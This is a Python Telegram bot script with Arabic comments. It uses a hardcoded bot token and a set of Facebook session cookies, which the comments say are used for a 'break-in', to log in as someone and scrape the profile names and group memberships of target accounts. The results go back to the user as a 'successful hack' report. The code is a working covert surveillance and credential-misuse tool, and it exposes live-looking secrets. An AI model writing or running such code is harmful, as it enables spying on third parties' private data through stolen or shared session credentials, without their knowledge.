import telebot, requests, re

API_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks'
bot = telebot.TeleBot(API_TOKEN)

# دمج الكوكيز حق فادي عشان الاقتحام
FB_COOKIES = {
    'c_user': '100003550913323',
    'xs': '31:yHNizqiAxU5oow:2:1768254323:-1:-1',
    'datr': 'iGplaV28PgweKRFA2B3ALpcC',
    'fr': '0ZAmSGvgnip1quTXs.AWeVmklM3dgxLADEPbPf9RKOWvKKTAbGSwUurLhAX6KDPFuJweU.BpZWqJ..AAA.0.0.BpbpB2.AWd0vgC9q6yPDiy5pd3vHn0SWU4'
}

print("🚀 المحرك الاستخباراتي شغال بالكوكيز.. الباب مفتوح يا فادي!")

def fetch_private_data(target_url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'ar-YE,ar;q=0.9'
        }
        # الدخول باستخدام الهوية (Cookies)
        res = requests.get(target_url, headers=headers, cookies=FB_COOKIES, timeout=15)
        
        # نبش المجموعات والنشاطات من الكود الداخلي
        groups = re.findall(r'facebook\.com/groups/(\d+)', res.text)
        profile_name = re.search(r'<title>(.*?)</title>', res.text)
        
        name = profile_name.group(1) if profile_name else "غير معروف"
        
        if groups:
            links = [f"🔗 https://www.facebook.com/groups/{g}" for g in set(groups)]
            return f"🎯 تم اختراق البيانات بنجاح!\n👤 الاسم: {name}\n\n📦 المجموعات المكتشفة:\n" + "\n".join(links[:15])
        else:
            return f"👤 الاسم: {name}\n🧐 دخلت الحساب بس المجموعات مخفية حتى عن الأصدقاء."
    except Exception as e:
        return f"❌ حصلت مشكلة في الاقتحام: {str(e)}"

@bot.message_handler(func=lambda m: True)
def handle_fadi_spy(message):
    if "facebook.com" in message.text:
        bot.reply_to(message, "🔦 جاري استخدام 'الهوية الرقمية' للدخول ونبش المجموعات...")
        report = fetch_private_data(message.text)
        bot.send_message(message.chat.id, f"📝 التقرير النهائي لـ فادي:\n\n{report}")
    else:
        bot.reply_to(message, "ارسل رابط الحساب اللي تشتي تنحره فحص.")

bot.polling()
